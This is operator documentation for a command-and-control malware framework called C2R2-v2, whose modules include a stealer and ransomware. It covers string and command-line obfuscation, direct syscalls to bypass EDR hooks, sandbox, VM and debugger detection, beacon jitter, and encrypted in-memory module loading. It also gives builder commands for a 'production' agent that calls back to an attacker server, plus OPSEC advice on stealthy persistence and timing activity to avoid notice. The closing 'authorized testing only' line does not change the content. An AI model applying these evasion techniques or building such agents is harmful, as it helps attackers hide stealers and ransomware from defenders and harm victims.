# Evasion Techniques

This document describes the anti-analysis and evasion techniques implemented in C2R2-v2.

## Overview

C2R2-v2 implements multiple layers of evasion to avoid detection by security products:

| Technique | Description | When Applied |
|-----------|-------------|--------------|
| Direct Syscalls | Bypass userland API hooks | Runtime |
| String Obfuscation | Encrypt sensitive strings | Compile-time |
| Command Obfuscation | ArgFuscator-style obfuscation | Command execution |
| Module Encryption | AES-256-GCM encrypted modules | Module transfer |
| Anti-Sandbox | VM/sandbox detection | Production mode |
| Anti-Debugging | Debugger detection | Production mode |
| Beacon Jitter | Randomized timing | Always |

---

## String Obfuscation

Uses compile-time encryption with the `obfstr` crate. Strings are encrypted at compile time and decrypted at runtime.

```rust
use obfstr::obfstr;

// Encrypted at compile time, decrypted at runtime
let cmd = obfstr!("cmd.exe");
let powershell = obfstr!("powershell.exe");
let registry_key = obfstr!(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
```

### What's Obfuscated
- Command paths (`cmd.exe`, `powershell.exe`)
- Registry keys and paths
- File paths
- API names
- Error messages
- SQL queries (in stealer)

---

## Command Obfuscation (ArgFuscator)

Automatically applies obfuscation to all commands sent to agents, making command-line detection more difficult.

### Techniques

1. **Random Case Changes**
   - Original: `whoami`
   - Obfuscated: `wHoAmI`, `WhOaMi`, `WHOamI`

2. **Caret Insertion**
   - Original: `whoami`
   - Obfuscated: `who^ami`, `w^h^o^a^m^i`
   - Windows `cmd.exe` ignores carets in most contexts

3. **Quote Insertion**
   - Original: `whoami`
   - Obfuscated: `"w"h"o"ami`, `w"h"o"a"mi`

4. **Environment Variable Substitution**
   - Original: `C:\Windows\System32\cmd.exe`
   - Obfuscated: `%windir%\System32\cmd.exe`
   - Original: `cmd.exe`
   - Obfuscated: `%COMSPEC%`

### Example

```rust
// Original command
/cmd whoami

// Possible obfuscated results:
cmd.exe /c "wHoAmI"
cmd.exe /c "who^ami"
cmd.exe /c "w\"h\"o\"ami"
%COMSPEC% /c "wHoAmI"
```

---

## Direct Syscalls

Bypasses userland API hooks by calling NT syscalls directly, evading EDR/AV that hook user-mode APIs.

### Implementation

Uses the `dinvk` crate for DInvoke-style syscall execution:

```rust
// Instead of calling standard Windows API which may be hooked:
// VirtualAlloc() -> hooked by EDR -> detected

// Direct syscall bypasses hooks:
// NtAllocateVirtualMemory -> syscall instruction -> kernel
```

### Hooked APIs Bypassed
- `VirtualAlloc` / `VirtualProtect`
- `CreateThread` / `CreateRemoteThread`
- `WriteProcessMemory`
- `LoadLibrary`

---

## Anti-Sandbox Detection

Implemented in `agent/src/evasion.rs` and only active in **production mode**.

### VM Detection

| Check | Method | VMs Detected |
|-------|--------|--------------|
| System Manufacturer | WMI query | VMware, VirtualBox, QEMU, Hyper-V, Xen, Parallels |
| Registry Keys | Registry queries | VM-specific entries |
| File System | File existence | VM driver files and DLLs |
| MAC Addresses | Network adapter | VM vendor MAC prefixes |

### Sandbox Detection

| Check | Method | Threshold |
|-------|--------|-----------|
| Uptime | `GetTickCount64` | < 10 minutes |
| CPU Cores | `GetSystemInfo` | < 2 cores |
| RAM | `GlobalMemoryStatusEx` | < 4 GB |
| Screen Resolution | `GetSystemMetrics` | < 1024x768 |
| Mouse Movement | `GetCursorPos` | No movement in 2 seconds |
| Recent Files | Filesystem | < 5 files |

### Debugger Detection

```rust
// IsDebuggerPresent API
if IsDebuggerPresent() != 0 {
    // Exit or behave benignly
}

// PEB BeingDebugged flag
// NtQueryInformationProcess
```

### Analysis Tool Detection

Scans for common analysis tools:
- OllyDbg, x64dbg, IDA Pro
- Process Hacker, Process Monitor
- Wireshark, Fiddler
- Frida, Cheat Engine

---

## Beacon Jitter

Randomizes check-in intervals to avoid creating predictable patterns that can be detected by network monitoring.

### Configuration

```
/beacon <interval>:<jitter_percent>

# Examples:
/beacon 60:30   # 60 seconds ±30% = 42-78 seconds
/beacon 300:40  # 300 seconds ±40% = 180-420 seconds
```

### Timing Examples

| Config | Min | Max | Average | Use Case |
|--------|-----|-----|---------|----------|
| `10:10` | 9s | 11s | 10s | Active operations |
| `30:20` | 24s | 36s | 30s | Normal operations |
| `60:30` | 42s | 78s | 60s | Default (balanced) |
| `300:40` | 180s | 420s | 300s | Long-term access |
| `600:50` | 300s | 900s | 600s | Maximum stealth |

### Exponential Backoff

On connection failures, the agent uses exponential backoff:
- 1st failure: wait 10 seconds
- 2nd failure: wait 20 seconds
- 3rd failure: wait 40 seconds
- ...continues doubling...
- Maximum: 600 seconds

---

## Module Encryption

Modules (stealer, ransomware) are encrypted with AES-256-GCM:

```
1. Build: Compile DLL module
2. Encrypt: Generate random 256-bit key, encrypt with AES-256-GCM
3. Deploy: Transfer encrypted module + key to agent
4. Load: Agent decrypts in memory
5. Execute: Call exported functions
6. Cleanup: Unload and free memory
```

### Files Generated
```
stealer.dll      → stealer.enc (encrypted)
                   stealer.key (32-byte key)
ransomware.dll   → ransomware.enc (encrypted)
                   ransomware.key (32-byte key)
```

---

## Build Modes

### Development Mode (Default)
- Console window visible
- Debug output enabled
- Anti-analysis **disabled**
- Use for testing only

```bash
cargo run -p builder -- build-agent --name test --server 127.0.0.1:4444
```

### Production Mode
- No console window
- No debug output
- Anti-analysis **enabled**
- Use for deployments

```bash
cargo run -p builder -- build-agent --name agent --server IP:PORT --production
```

---

## Detection Likelihood Matrix

| Feature | AV | EDR | Network | SOC |
|---------|-----|-----|---------|-----|
| Raw TCP beacon | Low | Medium | High | High |
| Direct syscalls | Low | Low | N/A | N/A |
| String obfuscation | Low | Low | N/A | N/A |
| Credential harvesting | Medium | High | Low | High |
| Persistence (Registry) | Low | Medium | Low | High |
| Persistence (WMI) | Low | Medium | Low | Low |

---

## OPSEC Recommendations

### Command Execution
- Avoid rapid-fire commands (wait for beacon intervals)
- Use built-in Windows tools when possible
- Avoid obvious reconnaissance patterns

### Network
- Use longer beacon intervals for long-term access (300-600s)
- High jitter percentage (40-50%) for unpredictability
- Consider using common ports (443, 8443, 80)

### Persistence
- WMI is most stealthy (requires admin)
- Avoid registry persistence when possible (easily detected)
- Use legitimate-looking service names

### File Operations
- Minimize file transfers
- Avoid downloading during business hours
- Clean up uploaded tools after use

---

## References

Inspired by techniques from:
- [Nightmangle](https://github.com/1N73LL1G3NC3x/Nightmangle)
- [DInvoke](https://github.com/TheWover/DInvoke)
- [Satan-Stealer](https://github.com/its-vichy/Satan-Stealer)

---

**⚠️ For authorized security testing purposes only.**
